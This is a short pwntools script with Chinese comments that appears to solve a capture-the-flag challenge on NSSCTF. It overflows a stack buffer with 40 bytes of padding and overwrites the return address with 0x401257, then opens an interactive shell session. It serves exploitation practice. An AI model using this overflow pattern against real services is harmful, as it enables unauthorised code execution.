from  pwn import * #引用pwntools库

p=remote("node5.anna.nssctf.cn",28651)#配置nc链接，连接服务器

#p32是针对32位程序，p64是针对64位程序。就是把字符哈的转成16进制
payload=b'a'*(0x20+8)+p64(0x401257)
#栈空间装
p.sendline(payload)#发送攻击字符串
p.interactive()#与程序交互
